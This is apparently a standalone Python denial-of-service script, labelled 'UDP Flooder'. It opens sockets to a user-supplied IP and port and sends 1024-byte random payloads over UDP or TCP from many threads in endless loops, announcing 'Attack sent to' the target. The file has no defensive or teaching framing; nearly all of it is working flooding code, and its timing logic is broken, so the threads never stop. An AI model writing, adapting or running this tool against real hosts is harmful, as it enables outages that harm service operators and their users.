import argparse
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

def run(ip, port, choice, times):
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if choice == 'udp' else socket.SOCK_STREAM)
            addr = (ip, port)
            for x in range(times):
                s.sendto(data, addr) if choice == 'udp' else s.send(data)
            print(i + "Packet Sent!!!")
        except:
            s.close()
            print("[!] Error!!!")

def start_attack(ip, port, choice, times, threads):
    for y in range(threads):
        th = threading.Thread(target=run, args=(ip, port, choice, times))
        th.start()

def clear():
    # for windows
    if name == 'nt':
        _ = system('cls')

    # for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')

def byebye():
    clear()
    os.system("figlet Youre Leaving Sir -f slant")
    sys.exit(130)

def exit_gracefully(signum, frame):
    # restore the original signal handler as otherwise evil things will happen
    # in raw_input when CTRL+C is pressed, and our signal handler is not re-entrant
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" You wanna exit bby <3 ?:"))
        if exitc == 'y':
            byebye()

    except KeyboardInterrupt:
        print("Ok ok, quitting")
        byebye()

    # restore the exit gracefully handler here
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='UDP Flooder')
    parser.add_argument('ip', type=str, help='target IP address')
    parser.add_argument('port', type=int, help='target port number')
    parser.add_argument('time', type=int, help='time in seconds to send the attack')
    parser.add_argument('protocol', type=str, choices=['udp', 'tcp'], help='protocol to use')
    parser.add_argument('packets', type=int, help='number of packets to send per connection')
    parser.add_argument('threads', type=int, help='number of threads to use')
    args = parser.parse_args()

    print("\033[1;34;40m \n")   
    
    start_time = time.time()
    end_time = start_time + args.time
    print(f"Attack sent to {args.ip}:{args.port} for {args.time} seconds.")
    start_attack(args.ip, args.port, args.protocol, args.packets, args.threads)
    
    while time.time() < end_time:
        continue

    # store the original SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)


